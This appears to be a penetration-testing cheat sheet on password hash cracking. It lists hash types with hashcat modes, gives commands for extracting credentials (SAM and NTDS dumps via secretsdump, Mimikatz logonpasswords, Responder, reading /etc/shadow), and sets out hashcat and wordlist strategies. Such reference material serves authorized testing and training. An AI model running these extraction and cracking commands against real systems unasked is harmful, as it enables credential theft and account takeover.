# 🔨 Hash Cracking & Password Attacks

> **Scope:** Understanding hash types, extraction methods, and cracking strategies.

---

## 📋 Attack Types

| Attack | Description | When to Use |
|--------|-------------|-------------|
| Dictionary | Try every word in a wordlist | First attempt, fast |
| Rules | Transform wordlist (Password → P@ssw0rd!) | After plain dictionary fails |
| Brute-force | Try all combinations | Short passwords, known pattern |
| Hybrid | Wordlist + appended/prepended chars | Common patterns (word+digits) |
| Rainbow tables | Pre-computed hash lookups | Unsalted hashes only |
| Credential stuffing | Reuse leaked credentials | Known breached accounts |
| Password spraying | One password, many users | AD environments |

---

## 🔢 Common Hash Types & Sources

### Windows
| Hash | Source | Hashcat Mode | Cracking Speed |
|------|--------|-------------|----------------|
| NTLM | SAM, secretsdump | -m 1000 | Very fast |
| NetNTLMv2 | Responder, relay | -m 5600 | Fast |
| LM | Legacy (pre-Vista) | -m 3000 | Instant |
| MSCache2 | Cached domain creds | -m 2100 | Slow |

### Linux
| Hash | Source | Hashcat Mode | Identifier |
|------|--------|-------------|------------|
| MD5crypt | /etc/shadow | -m 500 | $1$ |
| SHA-256crypt | /etc/shadow | -m 7400 | $5$ |
| SHA-512crypt | /etc/shadow | -m 1800 | $6$ |
| bcrypt | Web apps | -m 3200 | $2a$ / $2b$ |

### Active Directory
| Hash | Source | Hashcat Mode |
|------|--------|-------------|
| Kerberoast (TGS) | GetUserSPNs | -m 13100 |
| AS-REP Roast | GetNPUsers | -m 18200 |
| NTDS.dit | secretsdump (DCSync) | -m 1000 |

### Web & Applications
| Hash | Hashcat Mode | Common In |
|------|-------------|-----------|
| MD5 | -m 0 | Legacy web apps |
| SHA-1 | -m 100 | Legacy web apps |
| SHA-256 | -m 1400 | Modern apps |
| bcrypt | -m 3200 | Django, Rails, Node |
| WordPress | -m 400 | WordPress sites |

---

## 🛠️ Hash Extraction

### Windows
```bash
# SAM dump (local hashes) — need SYSTEM + SAM files
reg save HKLM\SAM SAM
reg save HKLM\SYSTEM SYSTEM
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# DCSync (domain hashes) — need DA or replication rights
impacket-secretsdump domain/admin:pass@DC_IP

# From memory (Mimikatz)
sekurlsa::logonpasswords

# Responder (NetNTLMv2)
responder -I eth0 -dwPv
# Hashes saved to /usr/share/responder/logs/
```

### Linux
```bash
# /etc/shadow (need root)
cat /etc/shadow

# Unshadow for John
unshadow /etc/passwd /etc/shadow > hashes.txt
```

### Files & Applications
```bash
# SSH keys
ssh2john id_rsa > hash.txt

# ZIP/RAR
zip2john file.zip > hash.txt
rar2john file.rar > hash.txt

# KeePass
keepass2john database.kdbx > hash.txt

# Office documents
office2john document.docx > hash.txt

# PDF
pdf2john file.pdf > hash.txt
```

---

## ⚡ Cracking Strategy (Order of Operations)

```
1. Identify hash type
   → hashid, hashcat --identify, or manual inspection

2. Try common passwords first (fast)
   → hashcat -m MODE hash.txt /usr/share/seclists/Passwords/Common-Credentials/top-1000.txt

3. Wordlist attack
   → hashcat -m MODE hash.txt rockyou.txt

4. Wordlist + rules (covers mutations)
   → hashcat -m MODE hash.txt rockyou.txt -r best64.rule

5. Targeted wordlist (CeWL from target website)
   → cewl http://target.com -d 3 -m 5 -w custom_wordlist.txt
   → hashcat -m MODE hash.txt custom_wordlist.txt -r best64.rule

6. Mask attack (if you know the pattern)
   → hashcat -m MODE hash.txt -a 3 ?u?l?l?l?l?d?d?s

7. Hybrid (wordlist + digits)
   → hashcat -m MODE hash.txt rockyou.txt -a 6 ?d?d?d?d
```

---

## 📂 Wordlists

| Wordlist | Size | Location (Kali) |
|----------|------|-----------------|
| rockyou.txt | 14M | /usr/share/wordlists/rockyou.txt |
| SecLists Common | Various | /usr/share/seclists/Passwords/ |
| CeWL (custom) | Variable | Generate from target website |
| Crunch (generated) | Variable | Generate by pattern |

### Generate Custom Wordlists
```bash
# CeWL (scrape target website for words)
cewl http://target.com -d 3 -m 5 -w wordlist.txt

# Crunch (generate by pattern)
crunch 8 8 -t @@@@%%%% -o wordlist.txt
# @ = lowercase, % = digit, ^ = special, , = uppercase

# Username-based (common patterns)
# john → John1, john123, John2024!, j0hn
```

---

## 🔗 Associated Tools
- [Hashcat](../../TOOLS/Hashcat.md) - GPU cracking (fast)
- [John the Ripper](../../TOOLS/john_the_ripper.md) - CPU cracking (versatile)
- [Hydra](../../TOOLS/hydra.md) - Online brute-force
